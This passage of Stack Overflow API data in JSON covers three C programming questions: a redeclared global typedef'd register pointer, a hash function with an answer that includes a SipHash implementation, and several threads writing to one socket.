"e0k, thanks for the suggestion, but that didn&#39;t address the issue. Additionally, I don&#39;t think that the <code>test_regs.h</code> can be sourced multiple times as is, as your suggestion would seem to imply, since the same redeclaration error does not occur for <code>ok_global</code>."}, {"owner": {"reputation": 539, "user_id": 3570982, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/c1b2836313c9a217631db857df993d92?s=128&d=identicon&r=PG&f=1", "display_name": "user3570982", "link": "https://stackoverflow.com/users/3570982/user3570982"}, "edited": false, "score": 1, "creation_date": 1482897597, "post_id": 41354327, "comment_id": 69912065, "body": "iharob, thank you for the style advice, but that&#39;s not relevant to the issue posted. Also, these are in fact opaque types."}, {"owner": {"reputation": 539, "user_id": 3570982, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/c1b2836313c9a217631db857df993d92?s=128&d=identicon&r=PG&f=1", "display_name": "user3570982", "link": "https://stackoverflow.com/users/3570982/user3570982"}, "edited": false, "score": 1, "creation_date": 1482941433, "post_id": 41354327, "comment_id": 69932861, "body": "Thanks Charlotte! That appears to have been the issue. I didn&#39;t even think to look at that. Thanks again for taking the time to understand what was at issue, and what wasn&#39;t."}], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1482891595, "post_id": 41354449, "comment_id": 69910936, "body": "But you <i>can</i> declare the functions <code>extern</code>, too, if you want that consistency.  It just happens to be redundant to do so for them."}, {"owner": {"reputation": 539, "user_id": 3570982, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/c1b2836313c9a217631db857df993d92?s=128&d=identicon&r=PG&f=1", "display_name": "user3570982", "link": "https://stackoverflow.com/users/3570982/user3570982"}, "edited": false, "score": 0, "creation_date": 1482896934, "post_id": 41354449, "comment_id": 69911962, "body": "Respectfully, that&#39;s not what&#39;s going on. That ignores the macro defines wrapped around the <code>tasks.h</code> header file to preclude multiple declarations, and it ignores the fact that <code>ok_global</code> compiles without error. This problem is specific to <code>TST</code>. Additionally, when I declare <code>TST</code> in <code>tasks.h</code> with an <code>extern</code>, and then declare it without the <code>extern</code> in <code>tasks.c</code>, I still get the &quot;previous declaration&quot; error; it just indicates that the previous declaration was in <code>tasks.c</code> instead of <code>tasks.h</code>."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "reply_to_user": {"reputation": 539, "user_id": 3570982, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/c1b2836313c9a217631db857df993d92?s=128&d=identicon&r=PG&f=1", "display_name": "user3570982", "link": "https://stackoverflow.com/users/3570982/user3570982"}, "edited": false, "score": 0, "creation_date": 1482898286, "post_id": 41354449, "comment_id": 69912222, "body": "@user3570982 The macro guards defend against a given header being included in more than once in a given source module, but it does <b>not</b> defend against multiple source modules including that header, and that header contains a definition like you have.  As for <code>ok_global</code>, it&#39;s possible that the linker may only be catching the first instance of a duplicate variable.  Give the above changes a try and see how it works."}, {"owner": {"reputation": 539, "user_id": 3570982, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/c1b2836313c9a217631db857df993d92?s=128&d=identicon&r=PG&f=1", "display_name": "user3570982", "link": "https://stackoverflow.com/users/3570982/user3570982"}, "edited": false, "score": 1, "creation_date": 1482898700, "post_id": 41354449, "comment_id": 69912312, "body": "Thanks for the explanation. I tried your suggestion, but encountered essentially the same errors: <code>tasks.h:4: error: conflicting types for &#39;TST&#39; tasks.c:3: error: previous declaration of &#39;TST&#39; was here</code>"}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": false, "score": 3, "last_activity_date": 1482890845, "creation_date": 1482890845, "answer_id": 41354449, "question_id": 41354327, "link": "https://stackoverflow.com/questions/41354327/shared-global-typedefd-variable-in-c-redeclared/41354449#41354449", "title": "Shared Global Typedef&#39;d Variable in C Redeclared", "body": "<p>The variables <code>TST</code> and <code>ok_global</code> are <strong>defined</strong> in tasks.h.  Since both main.c and tasks.c both include this header, those variables are defined in both modules.  When those modules are then linked together, you get an error for multiple definitions.</p>\n\n<p>Global variables should be <strong>defined</strong> in exactly one .c file.  Any .c file that needs to reference it should include a header file that has a <strong>declaration</strong> of this global.  A declaration says \"this variable exists somewhere\" but doesn't say exactly where.</p>\n\n<p>In tasks.h, you declare the variables like this:</p>\n\n<pre><code>extern volatile TEST_REGS              TST;\nextern volatile int                    ok_global;\nvoid func();\n</code></pre>\n\n<p>Then you define them in tasks.c:</p>\n\n<pre><code>#include \"tasks.h\"\n\nvolatile TEST_REGS              TST;\nvolatile int                    ok_global;\n\nvoid func() {\n    TST-&gt;TEST_REG.CHAR1 = 0x52;\n    TST-&gt;TEST_REG.CHAR0 = 0x51;\n    ok_global++;\n}\n</code></pre>\n\n<p>Notice that you're already doing this with the <code>func</code> function.  The difference is that variable declarations require the <code>extern</code> keyword, while function declarations do not.</p>\n"}], "owner": {"reputation": 539, "user_id": 3570982, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/c1b2836313c9a217631db857df993d92?s=128&d=identicon&r=PG&f=1", "display_name": "user3570982", "link": "https://stackoverflow.com/users/3570982/user3570982"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 715, "favorite_count": 0, "closed_date": 1482900205, "answer_count": 1, "score": 1, "last_activity_date": 1482901191, "creation_date": 1482889717, "last_edit_date": 1482901191, "question_id": 41354327, "link": "https://stackoverflow.com/questions/41354327/shared-global-typedefd-variable-in-c-redeclared", "closed_reason": "Duplicate", "title": "Shared Global Typedef&#39;d Variable in C Redeclared", "body": "<p>I've encountered a problem that I cannot seem to resolve in which a global variable is claimed to be redeclared on the only line where it is declared. I have the following code:</p>\n\n<p>test_regs.h:</p>\n\n<pre><code>#define    TEST_REGS_BASE_ADDRESS       0xA0080000\n\ntypedef struct {\n    union {\n        unsigned int data;\n        struct {\n            unsigned int RESERVED     : 16;\n            unsigned int CHAR1        : 8;\n            unsigned int CHAR0        : 8;\n        };\n    };\n} TEST_REG_STRUCT;\n\ntypedef struct {\n    TEST_REG_STRUCT                     TEST_REG;\n} *TEST_REGS;\n</code></pre>\n\n<p>tasks.h:</p>\n\n<pre><code>#ifndef TASKS_H\n#include \"test_regs.h\"\n\nvolatile TEST_REGS              TST; // This line throws an error\nvolatile int                    ok_global;\n\nvoid func();\n\n#define TASKS_H\n#endif\n</code></pre>\n\n<p>tasks.c:</p>\n\n<pre><code>#include \"tasks.h\"\n\nvoid func() {\n    TST-&gt;TEST_REG.CHAR1 = 0x52;\n    TST-&gt;TEST_REG.CHAR0 = 0x51;\n    ok_global++;\n}\n</code></pre>\n\n<p>main.c:</p>\n\n<pre><code>#include \"tasks.h\"\n\nmain() {\n    TST = (TEST_REGS) TEST_REGS_BASE_ADDRESS;\n    ok_global = 0;\n    func();\n}\n</code></pre>\n\n<p>I attempt to compile the above code with the following command (using a minimal version of GCC developed for the Leon3 processor):</p>\n\n<p><code>sparc-elf-gcc -msoft-float -c -g -O2 -o test.o tasks.c main.c</code></p>\n\n<p>That compile attempt produces the following errors:</p>\n\n<p><code>tasks.h:4: error: conflicting types for 'TST'</code></p>\n\n<p><code>tasks.h:4: error: previous declaration of 'TST' was here</code></p>\n\n<p>Notably, the global variable, <code>ok_global</code> does not pose any problem; only the variable, the type having been declared in <code>test_regs.h</code>, <code>TST</code> produces the above error. This means that the error cannot be due to the header <code>tasks.h</code> somehow getting declared multiple times. Does anyone have any idea why my code as written is apparently illegal?</p>\n\n<p>I'd note that, if I get rid of all headers, except for <code>test_regs.h</code>, and make the declaration in one unified <code>C</code> file, the problem goes away. Also, I really must have the <code>test_regs.h</code> header separated from the <code>tasks.h</code> header, <code>test_regs.h</code> is machine-generated while <code>tasks.h</code> is not, and will change depending on the usage.</p>\n\n<hr>\n\n<p>Okay, since this apparently isn't sinking in for moderator-minded folks, this is not a duplicate question. I can structure my code in order to meet the suggestions in the existing post as follows (even sucking in the header, <code>test_regs.h</code>):</p>\n\n<p>tasks.h:</p>\n\n<pre><code>#ifndef TASKS_H\n#define TASKS_H\n#define    TEST_REGS_BASE_ADDRESS       0xA0080000\n\ntypedef struct {\n    union {\n        unsigned int data;\n        struct {\n            unsigned int RESERVED     : 16;\n            unsigned int CHAR1        : 8;\n            unsigned int CHAR0        : 8;\n        };\n    };\n} TEST_REG_STRUCT;\n\ntypedef struct {\n    TEST_REG_STRUCT                     TEST_REG;\n} *TEST_REGS;\n\nextern volatile TEST_REGS              TST;\nvolatile int                    ok_global;\n\nvoid func();\n\n#endif\n</code></pre>\n\n<p>tasks.c:</p>\n\n<pre><code>#include \"tasks.h\"\n\nvolatile TEST_REGS TST;\n\nvoid func() {\n    TST-&gt;TEST_REG.CHAR1 = 0x52;\n    TST-&gt;TEST_REG.CHAR0 = 0x51;\n    ok_global++;\n}\n</code></pre>\n\n<p>main.c:</p>\n\n<pre><code>#include \"tasks.h\"\n\nmain() {\n    TST = (TEST_REGS) TEST_REGS_BASE_ADDRESS;\n    ok_global = 0;\n    func();\n}\n</code></pre>\n\n<p>Compile command:</p>\n\n<p><code>sparc-elf-gcc -msoft-float -c -g -O2 -o test.o tasks.c main.c</code></p>\n\n<p>Result:</p>\n\n<p><code>tasks.h:20: error: conflicting types for 'TST'</code></p>\n\n<p><code>tasks.c:3: error: previous declaration of 'TST' was here</code></p>\n\n<p>There is something specific to <code>TST</code> that is breaking global sharing; this is not just a general \"how do I share global variables\" question.</p>\n"}, {"tags": ["c", "data-structures", "hash", "hashtable"], "comments": [{"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 1, "creation_date": 1482888654, "post_id": 41354190, "comment_id": 69910362, "body": "<a href=\"http://stackoverflow.com/questions/7666509/hash-function-for-string\" title=\"hash function for string\">stackoverflow.com/questions/7666509/hash-function-for-string</a>"}, {"owner": {"reputation": 4328, "user_id": 920069, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd39f0db1f22e1314746491df063602a?s=128&d=identicon&r=PG", "display_name": "Retired Ninja", "link": "https://stackoverflow.com/users/920069/retired-ninja"}, "edited": false, "score": 1, "creation_date": 1482889700, "post_id": 41354190, "comment_id": 69910562, "body": "Generated a lot of collisions for me using string permutations.  Unless you really need to reinvent the wheel use a proven hash function."}], "answers": [{"tags": [], "owner": {"reputation": 16402, "user_id": 4025095, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/blJ4L.jpg?s=128&g=1", "display_name": "Myst", "link": "https://stackoverflow.com/users/4025095/myst"}, "is_accepted": true, "score": 2, "last_activity_date": 1482890080, "last_edit_date": 1482890080, "creation_date": 1482889661, "answer_id": 41354319, "question_id": 41354190, "link": "https://stackoverflow.com/questions/41354190/implementation-of-hash-algorithm-converts-string-to-number/41354319#41354319", "title": "Implementation of hash algorithm converts string to number", "body": "<p>Hash functions technically belong to the branch of Cryptography, this has to do with the (questionable) definition and the (strict) requirements of the Hashing.</p>\n\n<p>Hence, it's highly recommended that you don't roll your own hashing algorithm and stick to existing (tested) algorithms that minimize collisions.</p>\n\n<p>Converting a string to a number isn't hashing... although it's probably a good way to experience collisions and ending up with untraceable issues when you think you came up with a unique value...</p>\n\n<p>Unless this isn't a school assignment where you were given some stub \"hash\" algorithm that's actually meant to satisfy an assignment (and not a real life implementation), try looking up real hashing algorithm. All of them come with pseudo code and most of them come with the C implementations that were used for testing.</p>\n\n<p>For example, <a href=\"https://131002.net/siphash/\" rel=\"nofollow noreferrer\">SipHash</a> is a very common string hashing algorithm used in some standard libraries (i.e. Ruby and Rust).</p>\n\n<p>Good Luck!</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Some people believe that using cryptographic hash functions is sub optimal. You should consider your use case, but... If you are using the hash to assume equity, I would suggest paying the performance price. If you're using the hash as an unsafe indicator, it might not matter.</p>\n\n<p>Here's <a href=\"http://www.cse.yorku.ca/~oz/hash.html\" rel=\"nofollow noreferrer\">a page with some non-cryptographic hash functions</a>.</p>\n\n<p>P.S.</p>\n\n<p>Here's an implementation I wrote for the SipHash I mentioned... My code isn't well tested, so if you find any issues, feel free to <a href=\"https://github.com/boazsegev/facil.io/blob/master/src/bscrypt/bscrypt/siphash.c\" rel=\"nofollow noreferrer\">post them here</a>.</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdint.h&gt;\n\n#define SIPHASH_DEFAULT_KEY                         \\\n  (uint64_t[]) { 0x0706050403020100, 0x0f0e0d0c0b0a0908 }\n\nuint64_t siphash24(const void *data, size_t len, uint64_t iv_key[2]);\n\n// clang-format off\n#if !defined(__BIG_ENDIAN__) &amp;&amp; !defined(__LITTLE_ENDIAN__)\n#   if defined(__has_include)\n#     if __has_include(&lt;endian.h&gt;)\n#      include &lt;endian.h&gt;\n#     elif __has_include(&lt;sys/endian.h&gt;)\n#      include &lt;sys/endian.h&gt;\n#     endif\n#   endif\n#   if !defined(__BIG_ENDIAN__) &amp;&amp; !defined(__LITTLE_ENDIAN__) &amp;&amp; \\\n                __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__\n#      define __BIG_ENDIAN__\n#   endif\n#endif\n\n#ifndef __unused\n#   define __unused __attribute__((unused))\n#endif\n// clang-format on\n\n/** 64Bit left rotation, inlined. */\n#define _lrot64(i, bits)                                                       \\\n  (((uint64_t)(i) &lt;&lt; (bits)) | ((uint64_t)(i) &gt;&gt; (64 - (bits))))\n\n#ifdef __BIG_ENDIAN__\n/* the algorithm was designed as little endian */\n/** inplace byte swap 64 bit integer */\n#define sip_local64(i)                                                         \\\n  (((i)&amp;0xFFULL) &lt;&lt; 56) | (((i)&amp;0xFF00ULL) &lt;&lt; 40) |                            \\\n      (((i)&amp;0xFF0000ULL) &lt;&lt; 24) | (((i)&amp;0xFF000000ULL) &lt;&lt; 8) |                 \\\n      (((i)&amp;0xFF00000000ULL) &gt;&gt; 8) | (((i)&amp;0xFF0000000000ULL) &gt;&gt; 24) |         \\\n      (((i)&amp;0xFF000000000000ULL) &gt;&gt; 40) | (((i)&amp;0xFF00000000000000ULL) &gt;&gt; 56)\n\n#else\n/** no need */\n#define sip_local64(i) (i)\n#endif\n\nuint64_t siphash24(const void *data, size_t len, uint64_t iv_key[2]) {\n  /* initialize the 4 words */\n  uint64_t v0 = iv_key[0] ^ 0x736f6d6570736575ULL;\n  uint64_t v1 = iv_key[1] ^ 0x646f72616e646f6dULL;\n  uint64_t v2 = iv_key[0] ^ 0x6c7967656e657261ULL;\n  uint64_t v3 = iv_key[1] ^ 0x7465646279746573ULL;\n  const uint64_t *w64 = data;\n  uint8_t len_mod = len &amp; 255;\n  union {\n    uint64_t i;\n    uint8_t str[8];\n  } word;\n\n#define _bs_map_SipRound                                                       \\\n  do {                                                                         \\\n    v2 += v3;                                                                  \\\n    v3 = _lrot64(v3, 16) ^ v2;                                                 \\\n    v0 += v1;                                                                  \\\n    v1 = _lrot64(v1, 13) ^ v0;                                                 \\\n    v0 = _lrot64(v0, 32);                                                      \\\n    v2 += v1;                                                                  \\\n    v0 += v3;                                                                  \\\n    v1 = _lrot64(v1, 17) ^ v2;                                                 \\\n    v3 = _lrot64(v3, 21) ^ v0;                                                 \\\n    v2 = _lrot64(v2, 32);                                                      \\\n  } while (0);\n\n  while (len &gt;= 8) {\n    word.i = sip_local64(*w64);\n    v3 ^= word.i;\n    /* Sip Rounds */\n    _bs_map_SipRound;\n    _bs_map_SipRound;\n    v0 ^= word.i;\n    w64 += 1;\n    len -= 8;\n  }\n  word.i = 0;\n  uint8_t *pos = word.str;\n  uint8_t *w8 = (void *)w64;\n  switch (len) {\n  case 7:\n    pos[6] = w8[6];\n  case 6:\n    pos[5] = w8[5];\n  case 5:\n    pos[4] = w8[4];\n  case 4:\n    pos[3] = w8[3];\n  case 3:\n    pos[2] = w8[2];\n  case 2:\n    pos[1] = w8[1];\n  case 1:\n    pos[0] = w8[0];\n  }\n  word.str[7] = len_mod;\n  // word.i = sip_local64(word.i);\n\n  /* last round */\n  v3 ^= word.i;\n  _bs_map_SipRound;\n  _bs_map_SipRound;\n  v0 ^= word.i;\n  /* Finalization */\n  v2 ^= 0xff;\n  /* d iterations of SipRound */\n  _bs_map_SipRound;\n  _bs_map_SipRound;\n  _bs_map_SipRound;\n  _bs_map_SipRound;\n  /* XOR it all together */\n  v0 ^= v1 ^ v2 ^ v3;\n#undef _bs_map_SipRound\n  return v0;\n}\n\n#undef sip_local64\n#undef _lrot64\n</code></pre>\n\n<p>(the <code>switch</code> case fall through is intentional)</p>\n"}], "owner": {"reputation": 49, "user_id": 5827318, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh6.googleusercontent.com/-YGoSSZnyO7A/AAAAAAAAAAI/AAAAAAAACzQ/9iQ4ODnglMw/photo.jpg?sz=128", "display_name": "Kuba Ronkiewicz", "link": "https://stackoverflow.com/users/5827318/kuba-ronkiewicz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1757, "favorite_count": 0, "accepted_answer_id": 41354319, "answer_count": 1, "score": 0, "last_activity_date": 1482890080, "creation_date": 1482888353, "question_id": 41354190, "link": "https://stackoverflow.com/questions/41354190/implementation-of-hash-algorithm-converts-string-to-number", "title": "Implementation of hash algorithm converts string to number", "body": "<p>I have to implement hash table,\nI got scheme that shows how to convert string to number (hash function):</p>\n\n<pre><code>abcdef... -&gt; ((256*a+b) XOR (256*c+d)) XOR (256*e+f) ...\n</code></pre>\n\n<p>I'm writing this question, because I'm not sure if this code (mainly loops) works in a proper way.</p>\n\n<pre><code>int hash(char *s){\n    int len = strlen(s);\n    int i, result = 0;\n    for(i = 0; i &lt; len-1; i=i+2) {\n            result ^= ((256*s[i])+s[i+1]);\n    }\n    if(s[i]!=0) {\n            result ^= (256*s[i]);\n    }\n    return result;\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "sockets"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1482888200, "post_id": 41354154, "comment_id": 69910276, "body": "The best approach is to make sure that only one thread reads/writes the socket. NB: before deciding to use threads, you need to explain why blocking is undesirable."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 0, "creation_date": 1482888494, "post_id": 41354154, "comment_id": 69910333, "body": "Vote to close: too broad"}, {"owner": {"reputation": 1880, "user_id": 1269074, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/NSGtc.jpg?s=128&g=1", "display_name": "Oladipo Olasemo", "link": "https://stackoverflow.com/users/1269074/oladipo-olasemo"}, "edited": false, "score": 0, "creation_date": 1482888542, "post_id": 41354154, "comment_id": 69910341, "body": "The application is a USSD application - Unstructured Supplementary Service Data. It will serve multiple users dialing a short code sometimes almost at the same time. The USSD gateway has a timeout in effect and it is required that client applications provide a response within this time frame. User experience will drastically be affected when they have to wait and sometimes their requests may time out."}, {"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 2, "creation_date": 1482888663, "post_id": 41354154, "comment_id": 69910363, "body": "@OladipoOlasemo Do you know <a href=\"http://man7.org/linux/man-pages/man2/select.2.html\" rel=\"nofollow noreferrer\"><code>select()</code></a>?"}, {"owner": {"reputation": 1880, "user_id": 1269074, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/NSGtc.jpg?s=128&g=1", "display_name": "Oladipo Olasemo", "link": "https://stackoverflow.com/users/1269074/oladipo-olasemo"}, "edited": false, "score": 0, "creation_date": 1482888714, "post_id": 41354154, "comment_id": 69910372, "body": "Yes. I read about it. Not sure how to implement it in actual code."}, {"owner": {"reputation": 16402, "user_id": 4025095, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/blJ4L.jpg?s=128&g=1", "display_name": "Myst", "link": "https://stackoverflow.com/users/4025095/myst"}, "edited": false, "score": 0, "creation_date": 1482890294, "post_id": 41354154, "comment_id": 69910666, "body": "<a href=\"http://facil.io\" rel=\"nofollow noreferrer\">facil.io</a> is designed for servers, but you can use it for a client as well. It will provide you with an evented design, allowing for both multi-threaded and single threaded non-blocking operations... there are others out there that will make your life easier."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482892970, "post_id": 41354154, "comment_id": 69911208, "body": "You can have as many threads as you like writing to a socket, but that doesn&#39;t in any way eliminate blocking. If one blocks they will all block. Unclear what you&#39;re asking."}, {"owner": {"reputation": 1880, "user_id": 1269074, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/NSGtc.jpg?s=128&g=1", "display_name": "Oladipo Olasemo", "link": "https://stackoverflow.com/users/1269074/oladipo-olasemo"}, "edited": false, "score": 0, "creation_date": 1482893398, "post_id": 41354154, "comment_id": 69911297, "body": "I noticed the client app closes the socket randomly. I have not been able to find out why. I read somewhere that it could be a direct result of multiple threads writing to the socket at the same time - sometimes it works, sometimes it doesn&#39;t - when it doesn&#39;t I assume the app crashed and socket closed. but i have no direct evidence for this. Is it okay to have multiple threads writing to a socket without using a queue of some sort or perhaps multiplexing?"}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482896898, "post_id": 41354154, "comment_id": 69911956, "body": "It&#39;s OK as long as you don&#39;t mind possible data interleaving, but it doesn&#39;t solve your actual problem. You should certainly know why your own code closes a socket."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1482897910, "post_id": 41354154, "comment_id": 69912140, "body": "<i>Why</i> don&#39;t you want to use blocking operations, or lock the one socket?  You&#39;re communicating across a network where the latencies are significantly larger than any performance impact on your application.  And there are almost certainly blocks/locks in the socket implementation anyway."}, {"owner": {"reputation": 1880, "user_id": 1269074, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/NSGtc.jpg?s=128&g=1", "display_name": "Oladipo Olasemo", "link": "https://stackoverflow.com/users/1269074/oladipo-olasemo"}, "reply_to_user": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482898841, "post_id": 41354154, "comment_id": 69912346, "body": "@EJP I totally agree. I must must know why it closes a socket"}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482902768, "post_id": 41354154, "comment_id": 69913414, "body": "Your code closes the socket: you only have to read the code to find out why. Are you using the right words? Do you perhaps mean that it randomly encounters <i>connection</i> resets?"}], "answers": [{"tags": [], "owner": {"reputation": 3189, "user_id": 7016303, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dYmXc.jpg?s=128&g=1", "display_name": "Mikel F", "link": "https://stackoverflow.com/users/7016303/mikel-f"}, "is_accepted": false, "score": 1, "last_activity_date": 1482903997, "last_edit_date": 1482903997, "creation_date": 1482889070, "answer_id": 41354264, "question_id": 41354154, "link": "https://stackoverflow.com/questions/41354154/multiple-threads-writing-to-a-socket/41354264#41354264", "title": "Multiple Threads Writing to a Socket", "body": "<p>To avoid blocking, you should research asynchronous operations. You can either learn how your particularly platform handles them, or use a library, such as ASIO (<a href=\"https://think-async.com/\" rel=\"nofollow noreferrer\">https://think-async.com/</a>) which will handle it for you.</p>\n"}, {"comments": [{"owner": {"reputation": 16936, "user_id": 7076153, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/erPUC.png?s=128&g=1", "display_name": "Stargateur", "link": "https://stackoverflow.com/users/7076153/stargateur"}, "edited": false, "score": 2, "creation_date": 1482896743, "post_id": 41354974, "comment_id": 69911934, "body": "&quot;Yes, you need to create threads if you want to do anything else while waiting for incoming TCP data&quot;, no. man select, poll. They are many way to do a server, thread is one of them."}, {"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482897041, "post_id": 41354974, "comment_id": 69911978, "body": "No, you don&#39;t &#39;need to create threads if you want to do anything else while waiting for incoming TCP data&#39;. You can use non-blocking or multiplexed or asynchronous I/O."}, {"owner": {"reputation": 101, "user_id": 6793927, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-UdPChX_VZp8/AAAAAAAAAAI/AAAAAAAABvo/sHIIOsBoAcs/photo.jpg?sz=128", "display_name": "Sanjeevkumar M", "link": "https://stackoverflow.com/users/6793927/sanjeevkumar-m"}, "edited": false, "score": 0, "creation_date": 1605760674, "post_id": 41354974, "comment_id": 114752485, "body": "select, poll , epoll are the best mechanism if you don&#39;t want to block your thread when there is no data in socket."}], "tags": [], "owner": {"reputation": 6306, "user_id": 5662469, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/ZYgSJ.png?s=128&g=1", "display_name": "Deepak K Gupta", "link": "https://stackoverflow.com/users/5662469/deepak-k-gupta"}, "is_accepted": false, "score": -2, "last_activity_date": 1482895553, "creation_date": 1482895553, "answer_id": 41354974, "question_id": 41354154, "link": "https://stackoverflow.com/questions/41354154/multiple-threads-writing-to-a-socket/41354974#41354974", "title": "Multiple Threads Writing to a Socket", "body": "<ul>\n<li><p>Yes, you need to create threads if you want to do anything else while waiting for incoming TCP data</p></li>\n<li><p>Yes, you need to take care of unexpected things that may happen  in a multi threaded programs</p></li>\n</ul>\n\n<p>You should use Mutexes to prevent the so called unexpected things. the <code>pthread</code> library you're using to create threads also contains synchronization primitives.</p>\n\n<p>A sample program may look like this</p>\n\n<pre><code>pthread_mutex_t tcp_lock;\n\nvoid ThreadFunction()\n{\n        pthread_mutex_lock(&amp;tcp_lock);\n        // Do your stuffs \n        pthread_mutex_unlock(&amp;tcp_lock);\n}\n\nint MainThread()\n{\n    pthread_mutex_lock(&amp;tcp_lock);\n    // Do your stuffs\n    pthread_mutex_unlock(&amp;tcp_lock);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2908, "user_id": 136087, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2e416152346ae8c9229b87d9f004e656?s=128&d=identicon&r=PG&f=1", "display_name": "EdH", "link": "https://stackoverflow.com/users/136087/edh"}, "is_accepted": false, "score": 0, "last_activity_date": 1482907233, "last_edit_date": 1482907233, "creation_date": 1482906901, "answer_id": 41356602, "question_id": 41354154, "link": "https://stackoverflow.com/questions/41354154/multiple-threads-writing-to-a-socket/41356602#41356602", "title": "Multiple Threads Writing to a Socket", "body": "<p>Might I recommend using libuv?  It's highly maintained (core of node.js) and cross-platform. </p>\n\n<p>Also, you should not use <code>select()</code> that's old school. If you did it yourself you should use <code>epoll()</code> on Linux. It scales <em>much</em> better. </p>\n\n<p>You should only have one writer thread ever. That thread should write when the socket is not busy. </p>\n\n<p>Checkout libuv - it handles all this messiness for you but still keeps you close to the metal. <a href=\"https://nikhilm.github.io/uvbook/networking.html\" rel=\"nofollow noreferrer\">https://nikhilm.github.io/uvbook/networking.html</a></p>\n\n<p>My approach on stuff like this is to typically have one writer thread, and a fast reader callback, usually just allocating memory for the incoming data, which then just delegates to 1 or more processing threads. If you want it fast 